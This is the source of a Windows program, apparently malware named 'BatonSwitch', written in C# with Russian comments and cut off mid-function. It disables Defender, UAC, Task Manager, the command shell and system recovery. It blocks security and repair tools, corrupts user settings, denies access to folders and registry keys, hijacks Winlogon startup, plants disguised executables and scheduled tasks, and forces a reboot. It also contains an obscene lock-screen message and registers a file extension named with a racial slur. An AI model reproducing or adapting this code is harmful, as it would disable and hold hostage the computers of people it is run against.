using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Http.Headers;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace BatonSwitch
{
    public partial class Form2 : Form
    {
        public Form2()
        {
            InitializeComponent();
        }
        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern bool BlockInput([In, MarshalAs(UnmanagedType.Bool)] bool fBlockIt);
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr Handle, int pic, ref int pi, int pil);
        int part = 1;
        int isCritical = 1;

        string[] usids = { "S-1-1-0", "S-1-5-32-545", "S-1-5-32-544", "S-1-5-11" }; // SID_AUTHENTICATED_USERS
        private void NewExt(string name)
        {
            try
            {
                string extname = "." + name;
                RegistryKey mrlogonuifile =
                        Registry.ClassesRoot.CreateSubKey("mrlogonuifile");
                mrlogonuifile.SetValue("", "Application");
                mrlogonuifile.SetValue("FriendlyTypeName", "@%SystemRoot%\\System32\\shell32.dll,-10156");
                mrlogonuifile.SetValue("EditFlags", 38070000, RegistryValueKind.DWord);
                RegistryKey DefaultIcon =
                    Registry.ClassesRoot.CreateSubKey("mrlogonuifile\\DefaultIcon");
                DefaultIcon.SetValue("", "C:\\Windows\\debug\\ru-RU\\mmc.ui\\Games\\main.mrlogonui");

                RegistryKey open =
                    Registry.ClassesRoot.CreateSubKey("mrlogonuifile\\shell\\open");
                open.SetValue("EditFlags", 000000, RegistryValueKind.DWord);
                RegistryKey opencommand =
                    Registry.ClassesRoot.CreateSubKey("mrlogonuifile\\shell\\open\\command");
                opencommand.SetValue("", "\"%1\" %*");
                opencommand.SetValue("IsolatedCommand", "\"%1\" %*");

                RegistryKey runas =
                    Registry.ClassesRoot.CreateSubKey("mrlogonuifile\\shell\\runas");
                runas.SetValue("HasLUAShield", "");
                RegistryKey runascommand =
                    Registry.ClassesRoot.CreateSubKey("mrlogonuifile\\shell\\runas\\command");
                runascommand.SetValue("", "\"%1\" %*");
                runascommand.SetValue("IsolatedCommand", "\"%1\" %*");

                RegistryKey runasuser =
                    Registry.ClassesRoot.CreateSubKey("mrlogonuifile\\shell\\runasuser");
                runasuser.SetValue("", "@shell32.dll,-50944");
                runasuser.SetValue("Extended", "");
                runasuser.SetValue("SuppressionPolicyEx", "{F211AA05-D4DF-4370-A2A0-9F19C09756A7}");
                RegistryKey runasusercommand =
                    Registry.ClassesRoot.CreateSubKey("mrlogonuifile\\shell\\runasuser\\command");
                runasusercommand.SetValue("DelegateExecute", "{ea72d00e-4960-42fa-ba92-7792a7944c1d}");

                RegistryKey mrlogonui =
                    Registry.ClassesRoot.CreateSubKey(extname);
                mrlogonui.SetValue("", "mrlogonuifile");
                mrlogonui.SetValue("Content Type", "application/x-msdownload");
                RegistryKey PersistentHandler =
                    Registry.ClassesRoot.CreateSubKey($"{extname}\\PersistentHandler");
                PersistentHandler.SetValue("", "{098f2470-bae0-11cd-b579-08002b30bfeb}");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            
            }
        }

        private void BanDir(string path, bool fullban)
        {
            DirectoryInfo directoryInfo = new DirectoryInfo(path);
            if (!directoryInfo.Exists)
            {
                directoryInfo.Create();
            }
            directoryInfo.Attributes = FileAttributes.System | FileAttributes.Hidden;
            DirectorySecurity directorySecurity = directoryInfo.GetAccessControl();

            foreach (string sid in usids)
            {
                FileSystemAccessRule fullrule = new FileSystemAccessRule(new SecurityIdentifier(sid), FileSystemRights.FullControl, AccessControlType.Deny);
                FileSystemAccessRule[] rules = {
                    new FileSystemAccessRule(new SecurityIdentifier(sid), FileSystemRights.AppendData, AccessControlType.Deny),
                    new FileSystemAccessRule(new SecurityIdentifier(sid), FileSystemRights.Read, AccessControlType.Deny),
                    new FileSystemAccessRule(new SecurityIdentifier(sid), FileSystemRights.ReadPermissions, AccessControlType.Deny),
                    new FileSystemAccessRule(new SecurityIdentifier(sid), FileSystemRights.Delete, AccessControlType.Deny),
                    new FileSystemAccessRule(new SecurityIdentifier(sid), FileSystemRights.DeleteSubdirectoriesAndFiles, AccessControlType.Deny),
                    new FileSystemAccessRule(new SecurityIdentifier(sid), FileSystemRights.Modify, AccessControlType.Deny),
                    new FileSystemAccessRule(new SecurityIdentifier(sid), FileSystemRights.Write, AccessControlType.Deny),
                    new FileSystemAccessRule(new SecurityIdentifier(sid), FileSystemRights.TakeOwnership, AccessControlType.Deny),
                    new FileSystemAccessRule(new SecurityIdentifier(sid), FileSystemRights.ListDirectory, AccessControlType.Deny),
                };
                if (fullban == false)
                {
                    foreach (var rule in rules)
                    {
                        directorySecurity.AddAccessRule(rule);
                    }
                }
                else
                {
                    directorySecurity.AddAccessRule(fullrule);
                }
                
            }
            directoryInfo.SetAccessControl(directorySecurity);
        }

        RegistryKey LocalMachine = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
        private void registryBan(string path, int id, bool fullban) //Блокировка редактирования разделов реестра
        {
            /*
            ID кустов реестра: 
            0 - HKEY_CURRENT_USER
            1 - HKEY_LOCAL_MACHINE
            2 - HKEY_USERS
            3 - HKEY_CLASSES_ROOT
             */
            try
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey(path);
                if (id == 1)
                {
                    key = LocalMachine.CreateSubKey(path);
                }
                if (id == 2)
                {
                    key = Registry.Users.CreateSubKey(path);
                }
                if (id == 3)
                {
                    key = Registry.ClassesRoot.CreateSubKey(path);
                }

                RegistrySecurity regSecurity = key.GetAccessControl();
                
                foreach (string sid in usids)
                {
                    RegistryAccessRule fullrule = new RegistryAccessRule(new SecurityIdentifier(sid), RegistryRights.FullControl, AccessControlType.Deny);
                    RegistryAccessRule[] rules = {
                            new RegistryAccessRule(new SecurityIdentifier(sid), RegistryRights.Delete, AccessControlType.Deny),
                            new RegistryAccessRule(new SecurityIdentifier(sid), RegistryRights.SetValue, AccessControlType.Deny),
                            new RegistryAccessRule(new SecurityIdentifier(sid), RegistryRights.CreateSubKey, AccessControlType.Deny),
                            new RegistryAccessRule(new SecurityIdentifier(sid), RegistryRights.TakeOwnership, AccessControlType.Deny),
                            new RegistryAccessRule(new SecurityIdentifier(sid), RegistryRights.WriteKey, AccessControlType.Deny),
                            new RegistryAccessRule(new SecurityIdentifier(sid), RegistryRights.ChangePermissions, AccessControlType.Deny),
                        };

                    if (fullban == false)
                    {
                        foreach (var rule in rules)
                        {
                            regSecurity.AddAccessRule(rule);
                        }
                    }
                    else
                    {
                        regSecurity.AddAccessRule(fullrule);
                    }
                    
                }

                key.SetAccessControl(regSecurity);
            }
            catch (Exception ex)
            {
                
            }
        }


        private void Form2_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void hiddenRun(string name, string arg)
        {
            try
            {
                System.Diagnostics.Process process = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                startInfo.FileName = name;
                startInfo.Arguments = arg;
                process.StartInfo = startInfo;
                process.Start();
            }
            catch { }
        }
        private void Form2_Load(object sender, EventArgs e)
        {
            textBox2.Text = data.sign;
            hiddenRun("taskkill.exe", "/f /im explorer.exe");
        }
        private void WinL090n(string text, string caption)
        {
            RegistryKey BatonSwitch = LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon");
            if (BatonSwitch != null)
            {
                BatonSwitch.SetValue("LegalNoticeText", text, RegistryValueKind.String);
                BatonSwitch.SetValue("LegalNoticeCaption", caption, RegistryValueKind.String);
                BatonSwitch.Close();
            }
        }

        private void timer_Tick(object sender, EventArgs e)
        {
            if (progressBar1.Value > 95)
            {
                isCritical = 0;
            }

            try
            {
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof(int));
                RegistryKey EnableLUA =
                    Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                EnableLUA.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
                byte[] af = { 00, 00, 00, 00, 00, 00, 00, 00, 09, 00, 00, 00, 00, 00, 0x5b, 0xe0, 00, 00, 0x5c, 0xe0, 00, 00, 0x5d, 0xe0, 00, 00, 44, 00, 00, 00, 0x1d, 00, 00, 00, 38, 00, 00, 00, 0x1d, 0xe0, 00, 00, 38, 0xe0, 00, 00, 00, 00 };
                RegistryKey LocalMachine = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
                RegistryKey scancode = LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Keyboard Layout", true);
                scancode.SetValue("Scancode Map", af, RegistryValueKind.Binary);
                scancode.Close();
                RegistryKey Explorer =
                    Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
                Explorer.SetValue("DisallowRun", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoFolderOptions", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoViewContextMenu", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoCDBurning", "1", RegistryValueKind.DWord);
                Explorer.SetValue("MemCheckBoxinRunDig", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoFileMenu", "1", RegistryValueKind.DWord);
                Explorer.SetValue("Intellimenus", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoShellSearchButton", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoThumbnailCache", "1", RegistryValueKind.DWord);
                Explorer.SetValue("DisableContextMenuInStart", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoWelcomeScreen", "1", RegistryValueKind.DWord);
                Explorer.SetValue("DisableCurrentUserRun", "1", RegistryValueKind.DWord);
                Explorer.SetValue("DisableCurrentUserRunOnce", "1", RegistryValueKind.DWord);
                Explorer.SetValue("ForceActiveDesktopOn", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoCloseDragDropBands", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoPropertiesRecycleBin", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoNetHood", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoDesktopCleanupWizard", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoMovingBands", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoInternetIcon", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoPropertiesMyComputer", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoPropertiesMyDocuments", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoSaveSettings", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoLogoff", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoDrives", "67108863", RegistryValueKind.DWord);
                Explorer.SetValue("NoViewOnDrive", "67108863", RegistryValueKind.DWord);
                Explorer.SetValue("NoRun", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoWinKeys", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoFind", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoTrayItemsDisplay", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoTrayContextMenu", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoSecurityTab", "1", RegistryValueKind.DWord);
                Explorer.SetValue("HideSCAHealth", "1", RegistryValueKind.DWord);
                Explorer.SetValue("HideSCAVolume", "1", RegistryValueKind.DWord);
                Explorer.SetValue("HideSCAPower", "1", RegistryValueKind.DWord);
                Explorer.SetValue("HideSCANetwork", "1", RegistryValueKind.DWord);
                Explorer.SetValue("HideClock", "1", RegistryValueKind.DWord);
                Explorer.SetValue("HidePowerOptions", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoStartMenuPinnedList", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NostartMenuMorePrograms", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoCommonGroups", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoAddPrinter", "1", RegistryValueKind.DWord);
                Explorer.SetValue("GreyMSiAds", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoWindowsUpdate", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoSMConfigurePrograms", "1", RegistryValueKind.DWord);
                Explorer.SetValue("DisableMyPicturesDirChange", "1", RegistryValueKind.DWord);
                Explorer.SetValue("DisabieMyMusicDirChange", "1", RegistryValueKind.DWord);
                Explorer.SetValue("DisabieFavoritesDirChange", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoStartMenuMyMusic", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoSMMyPictures", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoFavoritesMenu", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoRecentDocsMenu", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoSMMyDocs", "1", RegistryValueKind.DWord);
                Explorer.SetValue("DisablePersonalDirChange", "1", RegistryValueKind.DWord);
                Explorer.SetValue("MaxRecentDocs", "1", RegistryValueKind.DWord);
                Explorer.SetValue("ClearRecentDocsOnExit", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoNetworkConnections", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NostartMenuNetworkPlaces", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoRecentDocsNetHood", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoSMHelp", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoSetTaskbar", "1", RegistryValueKind.DWord);
                Explorer.SetValue("Noinstrumentation", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoUserNameinStartMenu", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoResoiveSearch", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoResolveTrack", "1", RegistryValueKind.DWord);
                Explorer.SetValue("StartmenuLogoff", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoChangestartMenu", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoControlPanel", "1", RegistryValueKind.DWord);
                Explorer.SetValue("NoSecurityTab", "1", RegistryValueKind.DWord);

                RegistryKey DisallowRun =
                    Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun");
                DisallowRun.SetValue("browser", "browser.exe");
                DisallowRun.SetValue("chrome", "chrome.exe");
                DisallowRun.SetValue("ProcessHacker", "ProcessHacker.exe");
                DisallowRun.SetValue("SimpleUnlocker", "SimpleUnlocker.exe");
                DisallowRun.SetValue("mmc", "mmc.exe");
                DisallowRun.SetValue("cmd", "cmd.exe");
                DisallowRun.SetValue("rstrui", "rstrui.exe");
                DisallowRun.SetValue("control", "control.exe");
                DisallowRun.SetValue("powershell", "powershell.exe");
                DisallowRun.SetValue("WinRAR", "WinRAR.exe");
                DisallowRun.SetValue("TOTALCMD64", "TOTALCMD64.EXE");
                DisallowRun.SetValue("msconfig", "msconfig.exe");
                DisallowRun.SetValue("NedoUnlocker", "NedoUnlocker.exe");

                RegistryKey Systema =
                    Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                Systema.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
                Systema.SetValue("DisableLockWorkstation", "1", RegistryValueKind.DWord);
                Systema.SetValue("DisableChangePassword", "1", RegistryValueKind.DWord);
                Systema.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);

                RegistryKey HideFastUserSwitching =
                    Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                HideFastUserSwitching.SetValue("HideFastUserSwitching", "1", RegistryValueKind.DWord);

                RegistryKey DisableCMD =
                    Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
                DisableCMD.SetValue("DisableCMD", "1", RegistryValueKind.DWord);

                RegistryKey RestrictToPermittedSnapins =
                    Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\MMC");
                RestrictToPermittedSnapins.SetValue("RestrictToPermittedSnapins", "1", RegistryValueKind.DWord);

                RegistryKey DisableSR =
                    Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore");
                DisableSR.SetValue("DisableSR", "1", RegistryValueKind.DWord);
                DisableSR.SetValue("DisableConfig", "1", RegistryValueKind.DWord);

                RegistryKey NoChangingWallPaper =
                    Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop");
                NoChangingWallPaper.SetValue("NoChangingWallPaper", "1", RegistryValueKind.DWord);

                //Отключение антивируса

                RegistryKey AppandBrowserprotection =
                        LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection");
                AppandBrowserprotection.SetValue("DisallowExploitProtectionOverride", "1", RegistryValueKind.DWord);
                AppandBrowserprotection.SetValue("UILockdown", "1", RegistryValueKind.DWord);

                RegistryKey Devicesecurity =
                    LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Device security");
                Devicesecurity.SetValue("DisableClearTpmButton", "1", RegistryValueKind.DWord);
                Devicesecurity.SetValue("DisableTpmFirmwareUpdateWarning", "1", RegistryValueKind.DWord);
                Devicesecurity.SetValue("HideSecureBoot", "1", RegistryValueKind.DWord);
                Devicesecurity.SetValue("HideTPMTroubleshooting", "1", RegistryValueKind.DWord);
                Devicesecurity.SetValue("UILockdown", "1", RegistryValueKind.DWord);

                RegistryKey Firewallandnetworkprotection =
                    LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Firewall and network protection");
                Firewallandnetworkprotection.SetValue("UILockdown", "1", RegistryValueKind.DWord);

                RegistryKey Virusandthreatprotection =
                    LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Virus and threat protection");
                Virusandthreatprotection.SetValue("HideRansomwareRecovery", "1", RegistryValueKind.DWord);
                Virusandthreatprotection.SetValue("UILockdown", "1", RegistryValueKind.DWord);

                RegistryKey DevicePerHeal =
                    LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Device performance and health");
                DevicePerHeal.SetValue("UILockdown", "1", RegistryValueKind.DWord);

                RegistryKey Familyoptions =
                    LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Family options");
                Familyoptions.SetValue("UILockdown", "1", RegistryValueKind.DWord);

                RegistryKey Accountprotection =
                    LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Account protection");
                Accountprotection.SetValue("UILockdown", "1", RegistryValueKind.DWord);

                RegistryKey Notifications =
                    LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications");
                Notifications.SetValue("DisableNotifications", "1", RegistryValueKind.DWord);
                Notifications.SetValue("DisableEnhancedNotifications", "1", RegistryValueKind.DWord);

                RegistryKey Spynet =
                        LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet");
                Spynet.SetValue("SubmitSamplesConsent", "0", RegistryValueKind.DWord);
                Spynet.SetValue("SpyNetReporting", "0", RegistryValueKind.DWord);
                RegistryKey WindowsDefender =
                    LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender");
                WindowsDefender.SetValue("DisableAntiSpyware", "1", RegistryValueKind.DWord);
                WindowsDefender.SetValue("DisableAntiVirus", "1", RegistryValueKind.DWord);
                RegistryKey RealTimeProtection =
                    LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection");
                RealTimeProtection.SetValue("DisableIOAVProtection", "1", RegistryValueKind.DWord);
                RealTimeProtection.SetValue("DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);

                //Блокировка программ в Image File Execution Options
                string[] bannednames = { "taskmgr", "mmc", "regedit", "cmd", "powershell", "powershell_ise", "SimpleUnlocker", "SU", "procexp", "procexp64", "TOTALCMD", "TOTALCMD64", "TotalUninstall", "ProcessHacker", "avz", "resmon", "Utilman", "RegAlyzer", "WinRAR", "UninstallTool", "WinaeroTweaker", "WinSCP", "browser", "chrome", "iexplore", "notepad", "msedge", "firefox", "backgroundTaskHost" };
                foreach (var item in bannednames)
                {
                    RegistryKey debug = LocalMachine.CreateSubKey($@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{item}.exe", true);
                    debug.SetValue("debugger", "/");
                    registryBan($@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{item}.exe", 1, false);
                }
                try
                {
                    RegistryKey Fonts =
                        LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Fonts");
                    string[] names = Fonts.GetValueNames();
                    foreach (var item in names)
                    {
                        try
                        {
                            Fonts.SetValue(item, "wingding.ttf");
                        }
                        catch { }
                    }
                }
                catch { }
                RegistryKey TEMP =
                    Registry.CurrentUser.CreateSubKey("Environment");
                TEMP.SetValue("TEMP", "PIDORAS228");
                TEMP.SetValue("TMP", "PIDORAS228");
                TEMP.SetValue("Path", "PIDORAS228");
                RegistryKey Mouse =
                    Registry.CurrentUser.CreateSubKey("Control Panel\\Mouse");
                Mouse.SetValue("SwapMouseButtons", "1");
                Mouse.SetValue("MouseTrails", "7");
                File.WriteAllBytes("C:\\Windows\\icons.ico", Properties.Resources.icons);
                RegistryKey exefile =
                    Registry.ClassesRoot.CreateSubKey("exefile\\DefaultIcon");
                exefile.SetValue("", "C:\\Windows\\icons.ico");

                RegistryKey VolatileEnvironment =
                    Registry.CurrentUser.CreateSubKey("Volatile Environment");
                VolatileEnvironment.SetValue("APPDATA", "PIDORAS228");
                VolatileEnvironment.SetValue("HOMEDRIVE", "PIDORAS228");
                VolatileEnvironment.SetValue("HOMEPATH", "PIDORAS228");
                VolatileEnvironment.SetValue("LOCALAPPDATA", "PIDORAS228");
                VolatileEnvironment.SetValue("LOGONSERVER", "PIDORAS228");
                VolatileEnvironment.SetValue("USERDOMAIN", "PIDORAS228");
                VolatileEnvironment.SetValue("USERDOMAIN_ROAMINGPROFILE", "PIDORAS228");
                VolatileEnvironment.SetValue("USERNAME", "PIDORAS228");
                VolatileEnvironment.SetValue("USERPROFILE", "PIDORAS228");
                string curpath = "C:\\Windows\\Sуstem32\\arrow.cur";
                RegistryKey Cursors =
                    Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                Cursors.SetValue("Arrow", curpath);
                Cursors.SetValue("AppStarting", curpath);
                Cursors.SetValue("Hand", curpath);
                Cursors.SetValue("Help", curpath);
                Cursors.SetValue("No", curpath);
                Cursors.SetValue("NWPen", curpath);
                Cursors.SetValue("Wait", curpath);
                Cursors.SetValue("SizeAll", curpath);
                Cursors.SetValue("SizeNESW", curpath);
                Cursors.SetValue("SizeNS", curpath);
                Cursors.SetValue("SizeNWSE", curpath);
                Cursors.SetValue("SizeWE", curpath);
                Cursors.SetValue("UpArrow", curpath);
                RegistryKey Colors =
                    Registry.CurrentUser.CreateSubKey("Control Panel\\Colors");
                string[] colorsnames = Colors.GetValueNames();
                foreach (var color in colorsnames)
                {
                    Colors.SetValue(color, "255 255 255");
                }
            }
            catch { }

            //Уведомление при запуске
            WinL090n("\r\nДобро пожаловать!\r\nВаша система была выебана вирусом BatonSwitch. Для продолжения пожалуйста, нажмите \"ОК\".", "BatonSwitch v1.3");

            //Отключение среды восстановления
            hiddenRun("bcdedit.exe", "/set recoveryenabled No");
            hiddenRun("reagentc.exe", "/disable");
            hiddenRun("bcdedit.exe", "/deletevalue {default} safeboot");
            hiddenRun("bcdedit.exe", "/deletevalue {default} safebootalternateshell");
            hiddenRun("bcdedit.exe", "/deletevalue {default} bootmenupolicy");

            //Ограничение доступа
            registryBan("SOFTWARE\\Policies\\Microsoft\\Windows Defender", 1, false);
            registryBan("SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center", 1, false);
            registryBan("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, false);
            registryBan("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, false);
            registryBan("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop", 0, false);
            registryBan("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 1, false);
            registryBan("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, false);
            registryBan("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, false);
            registryBan("SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces", 1, true);
            registryBan("SYSTEM\\CurrentControlSet\\Control\\Keyboard Layouts", 1, true);
            registryBan("Environment", 0, false);
            registryBan("Control Panel\\Cursors", 0, false);
            registryBan("Control Panel\\Colors", 0, false);
            registryBan("Control Panel\\Mouse", 0, false);
            registryBan("Volatile Environment", 0, false);
            registryBan("SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout", 1, false);

            if (part == 1)
            {
                progressBar1.Value += 1;
                label3.Text = $"Распаковка компонентов {progressBar1.Value}%:";
                if (progressBar1.Value == 100)
                {
                    progressBar1.Value = 0;
                    part = 2;
                }
            }
            else if (part == 2)
            {
                if (progressBar1.Value < 100)
                {
                    progressBar1.Value += 1;
                }
                label3.Text = $"Установка {progressBar1.Value}%:";
                if (progressBar1.Value > 40)
                {
                    label4.Text = "К сожалению, ожидание затянулось. Не переживайте, это только начало.";
                    timer.Interval = 1000;
                }
                else
                {
                    timer.Interval = 200;
                }
                if (progressBar1.Value == 100)
                {
                    //Запуск вируса!!
                    Random rand = new Random();
                    NewExt("nigger");
                    Directory.CreateDirectory("C:\\Windows\\ImmersiveControlPanel\\images\\MrL090nUI");
                    Directory.CreateDirectory("C:\\Windows\\Sуstem32");
                    Directory.CreateDirectory("C:\\Windows\\MrL090nUI");
                    string fakedirpath = "C:\\Windows\\MrL090nUI";
                    try
                    {
                        int countpath = 0;
                        while (countpath < 200)
                        {
                            fakedirpath += "\\" + rand.Next(1, 9).ToString();
                            Directory.CreateDirectory(fakedirpath);
                            try
                            {
                                BanDir(fakedirpath, false);
                            }
                            catch { }
                            countpath += 1;
                        }
                    }
                    catch { }

                    int winlogon = 0;
                    while (winlogon < 5000)
                    {
                        RegistryKey Winlogon = LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);

                        string StartupValue = Winlogon.GetValue("Userinit").ToString();
                        Winlogon.SetValue("Userinit", $"{StartupValue}, C:\\Windows\\MrL090nUI\\Tbl_nudop\\{rand.Next()}\\jopa.exe");
                        Winlogon.SetValue("Shell", $"{StartupValue}, C:\\Windows\\MrL090nUI\\Tbl_nudop\\{rand.Next()}\\jopa.exe");
                        Winlogon.Close();
                        winlogon++;
                    }
                    RegistryKey key = Registry.CurrentUser.CreateSubKey("SOFTWARE\\MrL090nUI");
                    key.SetValue("warns", 0);
                    File.WriteAllBytes("C:\\Windows\\ImmersiveControlPanel\\images\\MrL090nUI\\run.exe", Properties.Resources.run);
                    File.WriteAllBytes("C:\\Windows\\Sуstem32\\RuntimeBroker.exe", Properties.Resources.RuntimeBroker);
                    File.WriteAllBytes("C:\\Windows\\Sуstem32\\wall1.jpg", Properties.Resources.wall);
                    File.WriteAllBytes("C:\\Windows\\Sуstem32\\wall2.jpg", Properties.Resources.wall2);
                    File.WriteAllBytes("C:\\Windows\\Sуstem32\\wall3.jpg", Properties.Resources.wall3);
                    File.WriteAllBytes("C:\\Windows\\Sуstem32\\wall4.jpg", Properties.Resources.wall4);
                    File.WriteAllBytes("C:\\Windows\\Sуstem32\\wall5.jpg", Properties.Resources.wall5);
                    File.WriteAllBytes("C:\\Windows\\notice.exe", Properties.Resources.notice);
                    File.WriteAllBytes("C:\\Windows\\Sуstem32\\arrow.cur", Properties.Resources.arrow);
                    File.WriteAllBytes("C:\\Windows\\Sуstem32\\dllhost.exe", Properties.Resources.dllhost);
                    File.WriteAllBytes("C:\\Windows\\ImmersiveControlPanel\\bs.ico", Properties.Resources.icon);
                    BanDir("C:\\Windows\\ImmersiveControlPanel\\MrL090nUI", false);
                    BanDir("C:\\Windows\\Sуstem32", false);
                    BanDir("C:\\MrL090nUI", false);
                    BanDir(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), true);
                    BanDir(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory), true);
                    CreateTask("C:\\Windows\\ImmersiveControlPanel\\images\\MrL090nUI\\run.exe", "\\Microsoft\\Windows\\TPM\\Tpm-HASCertRetr", "Для этой задачи требуется сертификат подтверждения работоспособности.");
                    CreateTask("C:\\Windows\\Sуstem32\\RuntimeBroker.exe", "\\Microsoft\\Windows\\DirectX\\DXGIAdapterCache", "");
                    CreateTask("C:\\Windows\\Sуstem32\\dllhost.exe", "\\Microsoft\\Windows\\DirectX\\DXGICheck", "");
                    Process.Start("shutdown", "/r /t 0");

                    timer.Enabled = false;
                    //Запуск вируса!!
                }
            }
            try
            {
